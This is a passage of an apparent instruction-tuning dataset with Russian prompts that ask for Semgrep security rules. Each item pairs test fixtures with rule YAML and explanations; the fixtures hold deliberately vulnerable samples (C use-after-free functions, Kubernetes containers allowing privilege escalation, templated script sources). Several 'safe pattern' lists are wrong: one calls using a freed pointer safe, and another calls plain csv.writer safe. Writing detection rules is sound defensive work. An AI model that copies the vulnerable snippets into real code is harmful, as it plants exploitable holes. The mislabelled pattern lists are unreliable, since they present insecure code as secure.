ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:java-jwt-none-alg: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: java-jwt-none-alg\n  message: >-\n    Detected use of the 'none' algorithm in a JWT token.\n    The 'none' algorithm assumes the integrity of the token has already\n    been verified. This would allow a malicious actor to forge a JWT token\n    that will automatically be verified. Do not explicitly use the 'none'\n    algorithm. Instead, use an algorithm such as 'HS256'.\n  metadata:\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    source-rule-url: https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/\n    category: security\n    technology:\n    - jwt\n    confidence: HIGH\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n  languages: [java]\n  severity: ERROR\n  pattern-either:\n  - pattern: |\n      $JWT.sign(com.auth0.jwt.algorithms.Algorithm.none());\n  - pattern: |\n      $NONE = com.auth0.jwt.algorithms.Algorithm.none();\n      ...\n      $JWT.sign($NONE);\n  - pattern: |-\n      class $CLASS {\n        ...\n        $TYPE $NONE = com.auth0.jwt.algorithms.Algorithm.none();\n        ...\n        $RETURNTYPE $FUNC (...) {\n          ...\n          $JWT.sign($NONE);\n          ...\n        }\n        ...\n      }\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования алгоритма 'none' при создании JWT-токенов. Алгоритм 'none' предполагает, что целостность токена уже проверена, что делает возможным подделку токена злоумышленником. Правило использует шаблон поиска, который соответствует вызову метода sign с передачей объекта Algorithm.none(). Также учитываются случаи объявления переменной NONE, инициализированной алгоритмом none, и последующего вызова sign с использованием этой переменной.\n\n# Ключевые элементы:\n- ID: java-jwt-none-alg\n- Язык: java \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "java-jwt-none-alg",
      "language": "java",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: azure-dataexplorer-uses-disk-encryption\nОписание уязвимости: Ensure that Azure Data Explorer uses disk encryption\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-dataexplorer-uses-disk-encryption.tf\n# fail\n# ruleid: azure-dataexplorer-uses-disk-encryption\nresource \"azurerm_kusto_cluster\" \"example\" {\n    name                = \"kustocluster\"\n    location            = azurerm_resource_group.rg.location\n    resource_group_name = azurerm_resource_group.rg.name\n\n    sku {\n    name     = \"Standard_D13_v2\"\n    capacity = 2\n    }\n\n    tags = {\n    Environment = \"Production\"\n    }\n}\n\n# fail\n# ruleid: azure-dataexplorer-uses-disk-encryption\nresource \"azurerm_kusto_cluster\" \"example\" {\n    name                = \"kustocluster\"\n    location            = azurerm_resource_group.rg.location\n    resource_group_name = azurerm_resource_group.rg.name\n\n    sku {\n    name     = \"Standard_D13_v2\"\n    capacity = 2\n    }\n\n    tags = {\n    Environment = \"Production\"\n    }\n    enable_disk_encryption = false\n}\n\n# pass\nresource \"azurerm_kusto_cluster\" \"example\" {\n    name                = \"kustocluster\"\n    location            = azurerm_resource_group.rg.location\n    resource_group_name = azurerm_resource_group.rg.name\n\n    sku {\n    name     = \"Standard_D13_v2\"\n    capacity = 2\n    }\n    tags = {\n    Environment = \"Production\"\n    }\n    enable_disk_encryption = true\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_kusto_cluster\" \"example\" { ... enable_disk_encryption = false }\n• resource \"azurerm_kusto_cluster\" \"example\" { ... } // fail\n\nБезопасные паттерны:  \n• resource \"azurerm_kusto_cluster\" \"example\" { ... enable_disk_encryption = true }\n\nЛегенда аннотаций:\n- // ruleid:azure-dataexplorer-uses-disk-encryption: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-dataexplorer-uses-disk-encryption: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-dataexplorer-uses-disk-encryption\n  message: >-\n    Ensure that Azure Data Explorer uses disk encryption\n  patterns:\n  - pattern: resource\n  - pattern-not-inside: |\n      resource \"azurerm_kusto_cluster\" \"...\" {\n      ...\n      enable_disk_encryption = true\n      ...\n      }\n  - pattern-inside: |\n      resource \"azurerm_kusto_cluster\" \"...\" {\n      ...\n      }\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования ресурса типа 'azurerm_kusto_cluster' в конфигурациях Terraform языка HCL. Правило проверяет наличие атрибута 'enable_disk_encryption', который должен быть установлен в значение 'true'. Если этот атрибут отсутствует или имеет значение 'false', то правило считает такую конфигурацию небезопасной. Безопасная конфигурация должна явно указывать включение шифрования диска через установку 'enable_disk_encryption = true'.\n\n# Ключевые элементы:\n- ID: azure-dataexplorer-uses-disk-encryption\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-dataexplorer-uses-disk-encryption",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: use-defusedcsv\nОписание уязвимости: Detected the generation of a CSV file using the built-in `csv` module. If user data is used to generate the data in this file, it is possible that an attacker could inject a formula when the CSV is imported into a spreadsheet application that runs an attacker script, which could steal data from the importing user or, at worst, install malware on the user's computer. `defusedcsv` is a drop-in replacement with the same API that will attempt to mitigate formula injection attempts. You can use `defusedcsv` instead of `csv` to safely generate CSVs.\nCWE: CWE-1236: Improper Neutralization of Formula Elements in a CSV File\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-1236: Improper Neutralization of Formula Elements in a CSV File\n- Серьезность: INFO\n\nКонтекст кода:\n// File: use-defusedcsv.py\nimport csv\n\nwith open(\"file\", 'r') as fin:\n    # ok: use-defusedcsv\n    reader = csv.reader(fin)\n\nwith open(\"file\", 'w') as fout:\n    # ruleid: use-defusedcsv\n    writer = csv.writer(fout, quoting=csv.QUOTE_ALL)\n\nimport defusedcsv as csv\n\nwith open(\"file\", 'w') as fout:\n    # ok: use-defusedcsv\n    writer = csv.writer(fout)  # Ограничиваем длину\n\nОпасные паттерны:\n• writer = csv.writer(fout, quoting=csv.QUOTE_ALL)\n• writer = csv.writer(fout)\n\nБезопасные паттерны:  \n• writer = csv.writer(fout)\n• writer = defusedcsv.writer(fout)\n\nЛегенда аннотаций:\n- // ruleid:use-defusedcsv: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-defusedcsv: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: use-defusedcsv\n  patterns:\n  - pattern: csv.writer(...)\n  - pattern-not: defusedcsv.writer(...)\n  message: >-\n    Detected the generation of a CSV file using the built-in `csv` module.\n    If user data is used to generate the data in this file, it is possible that\n    an attacker could inject a formula when the CSV is imported into a spreadsheet\n    application that runs an attacker script, which could steal data from the importing\n    user or, at worst, install malware on the user's computer. `defusedcsv` is a\n    drop-in replacement with the same API that will attempt to mitigate formula\n    injection attempts. You can use `defusedcsv` instead of `csv` to safely generate CSVs.\n  metadata:\n    cwe:\n    - 'CWE-1236: Improper Neutralization of Formula Elements in a CSV File'\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://github.com/raphaelm/defusedcsv\n    - https://owasp.org/www-community/attacks/CSV_Injection\n    - https://web.archive.org/web/20220516052229/https://www.contextis.com/us/blog/comma-separated-vulnerabilities\n    category: security\n    technology:\n    - python\n    confidence: LOW\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n  fix-regex:\n    regex: csv\n    replacement: defusedcsv\n  languages: [python]\n  severity: INFO\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования стандартного модуля Python 'csv' при создании файлов CSV. Паттерн ищет вызов функции 'csv.writer()'. Однако, он исключает случаи, когда модуль 'defusedcsv' используется вместо стандартного 'csv', так как 'defusedcsv' предлагает безопасную альтернативу, предотвращающую инъекцию формул в файлы CSV. Правило предупреждает о потенциальной угрозе безопасности, связанной с возможностью выполнения вредоносных скриптов при открытии таких файлов.\n\n# Ключевые элементы:\n- ID: use-defusedcsv\n- Язык: python \n- Тип: audit\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "use-defusedcsv",
      "language": "python",
      "severity": "INFO",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: allow-privilege-escalation-true\nОписание уязвимости: In Kubernetes, each pod runs in its own isolated environment with its own  set of security policies. However, certain container images may contain  `setuid` or `setgid` binaries that could allow an attacker to perform  privilege escalation and gain access to sensitive resources. To mitigate  this risk, it's recommended to add a `securityContext` to the container in  the pod, with the parameter `allowPrivilegeEscalation` set to `false`.  This will prevent the container from running any privileged processes and  limit the impact of any potential attacks.  In the container `$CONTAINER` this parameter is set to `true` which makes this container much more vulnerable to privelege escalation attacks.\nCWE: CWE-732: Incorrect Permission Assignment for Critical Resource\nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: CWE-732: Incorrect Permission Assignment for Critical Resource\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: allow-privilege-escalation-true.test.yaml\napiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ok: allow-privilege-escalation-true\n    - name: nginx\n      image: nginx\n    # ok: allow-privilege-escalation-true\n    - name: postgres\n      image: postgres\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 3000\n        fsGroup: 2000\n    - name: redis\n      image: redis\n      securityContext:\n        # ruleid: allow-privilege-escalation-true\n        allowPrivilegeEscalation: true\n    - name: redis\n      securityContext:\n        # ruleid: allow-privilege-escalation-true\n        allowPrivilegeEscalation: true\n      image: redis\n    - securityContext:\n        # ruleid: allow-privilege-escalation-true\n        allowPrivilegeEscalation: true\n      name: redis\n      image: redis\n    # ok: allow-privilege-escalation-true\n    - name: haproxy\n      image: haproxy\n      securityContext:\n        allowPrivilegeEscalation: false\n\n\n// File: allow-privilege-escalation-true.fixed.test.yaml\napiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ok: allow-privilege-escalation-true\n    - name: nginx\n      image: nginx\n    # ok: allow-privilege-escalation-true\n    - name: postgres\n      image: postgres\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 3000\n        fsGroup: 2000\n    - name: redis\n      image: redis\n      securityContext:\n        # ruleid: allow-privilege-escalation-true\n        allowPrivilegeEscalation: false\n    - name: redis\n      securityContext:\n        # ruleid: allow-privilege-escalation-true\n        allowPrivilegeEscalation: false\n      image: redis\n    - securityContext:\n        # ruleid: allow-privilege-escalation-true\n        allowPrivilegeEscalation: false\n      name: redis\n      image: redis\n    # ok: allow-privilege-escalation-true\n    - name: haproxy\n      image: haproxy\n      securityContext:\n        allowPrivilegeEscalation: false  # Ограничиваем длину\n\nОпасные паттерны:\n• securityContext:\n  allowPrivilegeEscalation: true\n• allowPrivilegeEscalation: true\n  ...\n• securityContext:\n  allowPrivilegeEscalation: true\n  ...\n\nБезопасные паттерны:  \n• securityContext:\n  allowPrivilegeEscalation: false\n• allowPrivilegeEscalation: false\n  ...\n• securityContext:\n  allowPrivilegeEscalation: false\n  ...\n\nЛегенда аннотаций:\n- // ruleid:allow-privilege-escalation-true: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:allow-privilege-escalation-true: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: allow-privilege-escalation-true\n  patterns:\n  - pattern-inside: |\n      containers:\n        ...\n  - pattern-inside: |\n      - name: $CONTAINER\n        ...\n  - pattern-inside: |\n      image: ...\n      ...\n  - pattern-inside: |\n      securityContext:\n        ...\n  - pattern: |\n      allowPrivilegeEscalation: $TRUE\n  - metavariable-pattern:\n      metavariable: $TRUE\n      pattern: |\n        true\n  - focus-metavariable: $TRUE\n  fix: |\n    false\n  message: >-\n    In Kubernetes, each pod runs in its own isolated environment with its own \n    set of security policies. However, certain container images may contain \n    `setuid` or `setgid` binaries that could allow an attacker to perform \n    privilege escalation and gain access to sensitive resources. To mitigate \n    this risk, it's recommended to add a `securityContext` to the container in \n    the pod, with the parameter `allowPrivilegeEscalation` set to `false`. \n    This will prevent the container from running any privileged processes and \n    limit the impact of any potential attacks. \n    In the container `$CONTAINER` this parameter is set to `true` which makes\n    this container much more vulnerable to privelege escalation attacks.\n  metadata:\n    cwe:\n    - 'CWE-732: Incorrect Permission Assignment for Critical Resource'\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    - A06:2017 - Security Misconfiguration\n    references:\n    - https://kubernetes.io/docs/concepts/policy/pod-security-policy/#privilege-escalation\n    - https://kubernetes.io/docs/tasks/configure-pod-container/security-context/\n    - https://www.kernel.org/doc/Documentation/prctl/no_new_privs.txt\n    - https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html#rule-4-add-no-new-privileges-flag\n    category: security\n    technology:\n    - kubernetes\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [yaml]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска YAML-кода Kubernetes, где параметр `allowPrivilegeEscalation` установлен в значение `true`, что увеличивает риск привилегированного подъема (привилегий) и потенциальной эскалации прав. Анализ выполняется путем поиска структуры YAML, соответствующей контейнеру, содержащему секцию `securityContext`, внутри которой присутствует ключ `allowPrivilegeEscalation` со значением `true`. Правило использует оператор pattern-inside для ограничения области поиска и метапеременную $TRUE для точного соответствия значениям `true`.\n\n# Ключевые элементы:\n- ID: allow-privilege-escalation-true\n- Язык: yaml \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "allow-privilege-escalation-true",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: var-in-script-src\nОписание уязвимости: Detected a template variable used as the 'src' in a script tag. Although template variables are HTML escaped, HTML escaping does not always prevent malicious URLs from being injected and could results in a cross-site scripting (XSS) vulnerability. Prefer not to dynamically generate the 'src' attribute and use static URLs instead. If you must do this, carefully check URLs against an allowlist and be sure to URL-encode the result.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: var-in-script-src.ejs\n<!-- cf. https://github.com/caiomartini/mustache-demo/blob/97b9200ebd2d27953febff23e6718aa1aa9ee44d/demo-mustache.html -->\n<!DOCTYPE HTML>\n<html>\n\n<head>\n    <title>Demo Mustache.JS</title>\n    <meta charset=\"utf-8\">\n    <link rel=\"stylesheet\" href=\"node_modules\\bootstrap\\dist\\css\\bootstrap.min.css\">\n    <script type=\"text/javascript\" src=\"node_modules\\jquery\\dist\\jquery.min.js\"></script>\n    <script type=\"text/javascript\" src=\"node_modules\\bootstrap\\dist\\js\\bootstrap.min.js\"></script>\n    <script type=\"text/javascript\" src=\"node_modules\\mustache\\mustache.min.js\"></script>\n    <script type=\"text/javascript\" src=\"demo-mustache.js\"></script>\n</head>\n\n<!-- ok: var-in-script-src -->\n<script src=\"app.js\"></script>\n<!-- ok: var-in-script-src -->\n<script src=\"script.js\"></script>\n\n<div class=\"text-center\">\n    <!-- ok: var-in-script-src -->\n    <h2>Apresentando o time da <b><%= time.nome %></b></h2>\n    <!-- ok: var-in-script-src -->\n    <h6>Predio <%= time.predio %></h6>\n</div>\n<div class=\"container\" style=\"margin-top: 30px;\">\n    <div class=\"row\">\n        <div class=\"col-sm-6\">\n            <div class=\"card\">\n                <div class=\"card-header text-center\">\n                    <!-- ok: var-in-script-src -->\n                    <b><%= nome %></b>\n                </div>\n                <div class=\"card-body\">\n                    <!-- ok: var-in-script-src -->\n                    <%= template-table %>\n                </div>\n            </div>\n        </div>\n    </div>\n</div>\n\n<!-- ruleid: var-in-script-src -->\n<script src=\"./<%=reactDemoIndexBundleJs %>\" crossOrigin=\"anonymous\" integrity=\"<%=sri.reactDemoIndexBundleJs %>\"></script>\n\n</html>  # Ограничиваем длину\n\nОпасные паттерны:\n• <script src='<%var%>'></script>\n• <script src=\"<%=var%>\"></script>\n\nБезопасные паттерны:  \n• <script src='static-url'></script>\n• <script src=\"static-url\"></script>\n\nЛегенда аннотаций:\n- // ruleid:var-in-script-src: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:var-in-script-src: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: var-in-script-src\n  message: >-\n    Detected a template variable used as the 'src' in a script tag.\n    Although template variables are HTML escaped, HTML\n    escaping does not always prevent malicious URLs from being injected\n    and could results in a cross-site scripting (XSS) vulnerability.\n    Prefer not to dynamically generate the 'src' attribute and use static\n    URLs instead. If you must do this, carefully check URLs against an\n    allowlist and be sure to URL-encode the result.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://www.veracode.com/blog/secure-development/nodejs-template-engines-why-default-encoders-are-not-enough\n    - https://github.com/ESAPI/owasp-esapi-js\n    category: security\n    technology:\n    - express\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - generic\n  severity: WARNING\n  patterns:\n  - pattern-inside: <script ...>\n  - pattern-either:\n    - pattern-inside: src = '...'\n    - pattern-inside: src = \"...\"\n  - pattern: <% ... >\n  paths:\n    include:\n    - '*.ejs'\n    - '*.html'\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования переменных шаблонов внутри атрибута 'src' тегов <script>. Переменные шаблонов могут быть подвержены XSS-уязвимостям, даже если они проходят HTML-экранирование, поскольку не всегда гарантируется предотвращение инъекций вредоносных URL. Правило использует шаблон, который ищет тег <script>, содержащий атрибут 'src', значение которого формируется с использованием переменной шаблона (<% ... >).\n\n# Ключевые элементы:\n- ID: var-in-script-src\n- Язык: generic \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "var-in-script-src",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: use-after-free\nОписание уязвимости: Variable '$VAR' was used after being freed. This can lead to undefined behavior.\nCWE: CWE-416: Use After Free\nТип анализа: search\nЯзык: c",
    "input": "Требования:\n- Язык: c\n- Тип анализа: search\n- CWE: CWE-416: Use After Free\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: use-after-free.c\n#include <stdio.h>\n#include <stdlib.h>\n\ntypedef struct name {\n    char *myname;\n    void (*func)(char *str);\n} NAME;\n\nvoid other_func(char *ignored) {}\n\nint bad_code1() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    // ruleid: use-after-free\n    var->func(\"use after free\");\n    return 0;\n}\n\nint okay_code1() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    var = NULL;\n    // This will segmentation fault\n    // ok: use-after-free\n    var->func(\"use after free\");\n    return 0;\n}\n\nint bad_code2() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    // ruleid: use-after-free\n    other_func(var->myname);\n    return 0;\n}\n\nint okay_code2() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    var = NULL;\n    // This will segmentation fault\n    // ok: use-after-free\n    other_func(var->myname);\n    return 0;\n}\n\nstruct NAME {\n  char first_name[32];\n  int auth;\n} s_auth;\n\nint bad_code3(){\n    struct NAME *var;\n    var = malloc(sizeof(s_auth));\n    free(var);\n    // ruleid: use-after-free\n    if(var->auth){\n        printf(\"you have logged in already\");\n    }\n    else{\n        printf(\"you do not have the permision to log in.\");\n    }\n    return 0;\n\n}\n\n\nint ok_code3(){\n    struct NAME *var;\n    var = malloc(sizeof(s_auth));\n    free(var);\n    var=NULL;\n    // ok: use-after-free\n    if(var->auth){\n        printf(\"you have logged in already\");\n    }\n    else{\n        printf(\"you do not have the permision to log in.\");\n    }\n    return 0;\n\n}\n\nstruct lv {\n    int length;\n    char *value;\n} lv;\n\nstruct lv2 {\n    int length;\n    struct lv *lv;\n} lv2;\n\n\nint bad_code4(){\n    int initial = 1000;\n    struct lv *lv = malloc(sizeof(*lv));\n    lv->length = initial;\n    lv->value = malloc(initial);\n    free(lv);\n    // ruleid: use-after-free\n    free(lv->value);\n    return 0;\n}\n\nint ok_code4(){\n    int initial = 1000;\n    struct lv *lv = mal  # Ограничиваем длину\n\nОпасные паттерны:\n• var->func(\"use after free\");\n• other_func(var->myname);\n• if(var->auth){...}\n\nБезопасные паттерны:  \n• var = NULL; ... var->func(\"use after free\");\n• var = malloc(...); ... free(var); var->func(\"use after free\");\n• free(lv2->lv); free(lv2->lv->value); free(lv2);\n\nЛегенда аннотаций:\n- // ruleid:use-after-free: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-after-free: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: use-after-free\n    patterns:\n      - pattern-either:\n        - pattern: $VAR->$ACCESSOR\n        - pattern: (*$VAR).$ACCESSOR\n        - pattern: $VAR[$NUM]\n      - pattern-inside:\n          free($VAR);\n          ...\n      - pattern-not-inside:\n          $VAR = NULL;\n          ...\n      - pattern-not-inside:\n          free($VAR);\n          ...\n          $VAR = malloc(...);\n          ...\n    message: >-\n      Variable '$VAR' was used after being freed. This can lead to undefined behavior.\n    metadata:\n      cwe:\n        - \"CWE-416: Use After Free\"\n      references:\n        - https://cwe.mitre.org/data/definitions/416.html\n        - https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free/\n      category: security\n      technology:\n        - c\n      confidence: LOW\n      cwe2022-top25: true\n      cwe2021-top25: true\n      subcategory:\n        - vuln\n      likelihood: LOW\n      impact: HIGH\n    languages:\n      - c\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска переменных, которые используются после их освобождения (use-after-free). Анализ выполняется путем поиска выражений, ссылающихся на переменную ($VAR), которая была освобождена ранее с помощью функции free(). Правило использует комбинацию шаблонов для идентификации таких ссылок и исключений, связанных с корректным освобождением или перезаписью переменной. Шаблоны включают доступы через указатели ($VAR->$ACCESSOR), косвенный доступ через указатель ((*$VAR).$ACCESSOR) и индексированный доступ ($VAR[$NUM]). Исключения учитывают ситуации, когда переменная явно устанавливается в NULL или повторно выделяется памятью.\n\n# Ключевые элементы:\n- ID: use-after-free\n- Язык: c \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use-after-free",
      "language": "c",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: detect-openai\nОписание уязвимости: Possibly found usage of AI: OpenAI\nCWE: \nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-openai.go\npackage gpt\n\n// ruleid: detect-openai\nimport (\n\t\"context\"\n\t\"encoding/json\"\n\t\"errors\"\n\t\"fmt\"\n\t\"strings\"\n\t\"sync\"\n\t\"time\"\n\n\tgogpt \"github.com/sashabaranov/go-openai\"\n)\n\nvar ErrTooManyRequests = errors.New(\"too many requests\")\n\ntype Config struct {\n\tKeys    []string\n\tTimeout time.Duration\n}\n\ntype Client struct {\n\tid int\n\t*gogpt.Client\n}\n\ntype Handler struct {\n\tsync.Mutex\n\tcfg     Config\n\tindex   int\n\tclients []*Client\n}\n\ntype expectedType struct {\n\tTranslations []string `json:\"translations\"`\n}\n\nfunc New(cfg Config) *Handler {\n\th := &Handler{\n\t\tcfg:     cfg,\n\t\tclients: make([]*Client, len(cfg.Keys)),\n\t}\n\tfor i, key := range cfg.Keys {\n\t\tc := &Client{\n\t\t\tid:     i,\n            // ruleid: detect-openai\n\t\t\tClient: gogpt.NewClient(key),\n\t\t}\n\t\th.clients[i] = c\n\t}\n\treturn h\n}\n\nfunc (h *Handler) Translate(ctx context.Context, src, lang string) (string, error) {\n\tctx, cancel := context.WithTimeout(ctx, h.cfg.Timeout)\n\tdefer cancel()\n\th.Lock()\n\tclient := h.clients[h.index]\n\th.index = (h.index + 1) % len(h.clients)\n\th.Unlock()\n\n\tmsg := gogpt.ChatCompletionMessage{\n\t\tRole: \"user\", Content: fmt.Sprintf(\"Translate \\\"%s\\\" to %s. Give the result directly. Don't explain. Don't quote output.\", src, lang),\n\t}\n\n\trequest := gogpt.ChatCompletionRequest{\n\t\tModel: \"gpt-3.5-turbo\",\n\t\tMessages: []gogpt.ChatCompletionMessage{\n\t\t\tmsg,\n\t\t},\n\t\tMaxTokens:   1024,\n\t\tStop:        []string{\"STOP\"},\n\t\tTemperature: 0.1,\n\t}\n\n\tresp, err := client.CreateChatCompletion(ctx, request)\n\tif err != nil {\n\t\tvar perr *gogpt.APIError\n\n\t\tif errors.As(err, &perr) {\n\t\t\tif perr.HTTPStatusCode == 429 {\n\t\t\t\treturn \"\", ErrTooManyRequests\n\t\t\t}\n\t\t}\n\n\t\tvar cerr *gogpt.RequestError\n\t\tif errors.As(err, &cerr) {\n\t\t\tif cerr.HTTPStatusCode == 429 {\n\t\t\t\treturn \"\", ErrTooManyRequests\n\t\t\t}\n\t\t}\n\n\t\tif errors.Is(err, context.DeadlineExceeded) {\n\t\t\treturn \"\", ErrTooManyRequests\n\t\t}\n\n\t\treturn \"\", err\n\t}\n\n\tresult := \"\"\n\tif len(resp.Choices) > 0 {\n\t\tresult = strings.TrimSpace(resp.Choices[0].Message.Content)\n\t}\n\tret  # Ограничиваем длину\n\nОпасные паттерны:\n• import \"github.com/sashabaranov/go-openai\"\n\nvar client *gogpt.Client\nclient = gogpt.NewClient(\"key\")\n• import _ \"github.com/sashabaranov/go-openai\"\ngogpt.NewClient(\"key\")\n\nБезопасные паттерны:  \n• import \"github.com/sashabaranov/openai\"\n\ngoOpenai.NewClient(\"key\")\n• import _ \"github.com/sashabaranov/go-openai\"\n\nЛегенда аннотаций:\n- // ruleid:detect-openai: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-openai: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-openai\n    languages:\n      - go\n    severity: INFO\n    message: \"Possibly found usage of AI: OpenAI\"\n    pattern-either:\n      - pattern: import \"github.com/sashabaranov/go-openai\"\n      - pattern: gogpt.NewClient(...)\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможного использования API OpenAI в Go-коде. Анализ выполняется путем поиска импортов пакета 'github.com/sashabaranov/go-openai' и вызовов функции 'gogpt.NewClient(...)', которые могут указывать на применение OpenAI. Правило использует оператор 'pattern-either', чтобы охватить оба возможных шаблона.\n\n# Ключевые элементы:\n- ID: detect-openai\n- Язык: go \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-openai",
      "language": "go",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: avoid-raw\nОписание уязвимости: 'raw()' bypasses HTML escaping. If external data can reach here, this exposes your application to cross-site scripting (XSS) attacks. If you must do this, construct individual strings and mark them as safe for HTML rendering with `html_safe()`.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: ruby",
